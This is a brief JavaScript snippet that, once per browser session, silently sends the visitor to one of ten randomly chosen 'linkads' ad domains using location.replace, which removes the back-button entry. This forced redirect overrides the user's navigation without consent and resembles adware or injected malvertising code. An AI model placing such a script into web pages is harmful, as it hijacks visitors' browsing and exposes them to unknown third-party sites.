(function() {
    var REDIRECT_KEY = 'ad_redirect_done';
    
    if (!sessionStorage.getItem(REDIRECT_KEY)) {
        sessionStorage.setItem(REDIRECT_KEY, 'true');
        
        var adUrls = [
            "https://linkads1.com",
            "https://linkads2.com",
            "https://linkads3.com",
            "https://linkads4.com",
            "https://linkads5.com",
            "https://linkads6.com",
            "https://linkads7.com",
            "https://linkads8.com",
            "https://linkads9.com",
            "https://linkads10.com"
        ];
        
        var randomUrl = adUrls[Math.floor(Math.random() * adUrls.length)];
        
        window.location.replace(randomUrl);
    }
})();
